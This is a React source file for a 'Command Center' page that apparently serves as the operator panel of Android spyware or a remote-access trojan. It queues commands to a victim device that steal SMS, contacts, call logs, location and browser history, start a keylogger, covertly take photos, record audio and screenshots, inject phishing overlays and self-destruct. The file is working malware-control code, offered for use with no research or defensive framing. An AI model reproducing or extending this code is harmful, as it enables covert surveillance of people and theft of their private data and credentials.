import React, { useState } from 'react'
import { useParams } from 'react-router-dom'
import { devices as devApi } from '../api/client'
import toast from 'react-hot-toast'

const COMMANDS = [
  { label: 'Get SMS', type: 0x01 },
  { label: 'Get Contacts', type: 0x02 },
  { label: 'Get Location', type: 0x03 },
  { label: 'Start Keylogger', type: 0x04 },
  { label: 'Take Photo (Back)', type: 0x05 },
  { label: 'Record Audio 60s', type: 0x06 },
  { label: 'Screenshot', type: 0x07 },
  { label: 'List Apps', type: 0x08 },
  { label: 'Scan Files', type: 0x09 },
  { label: 'Inject Overlay', type: 0x0A },
  { label: 'Self Destruct', type: 0x0B, danger: true },
  { label: 'Get Call Log', type: 0x10 },
  { label: 'Browser History', type: 0x12 }
]

export default function CommandCenter() {
  const { id } = useParams<{ id: string }>()
  const [busy, setBusy] = useState<number | null>(null)

  const fire = async (type: number) => {
    if (!id) return
    setBusy(type)
    try {
      await devApi.command(id, type)
      toast.success('Command queued')
    } catch {
      toast.error('Failed')
    } finally { setBusy(null) }
  }

  return (
    <div className="min-h-screen bg-surface p-6">
      <h1 className="text-2xl font-bold text-white mb-6">Command Center</h1>
      <div className="grid grid-cols-3 gap-3">
        {COMMANDS.map(c => (
          <button key={c.type} onClick={() => fire(c.type)} disabled={busy === c.type}
            className={`py-3 px-4 rounded text-white text-sm transition disabled:opacity-50
              ${c.danger ? 'bg-danger hover:bg-red-600' : 'bg-panel border border-border hover:border-accent'}`}>
            {busy === c.type ? '…' : c.label}
          </button>
        ))}
      </div>
    </div>
  )
}
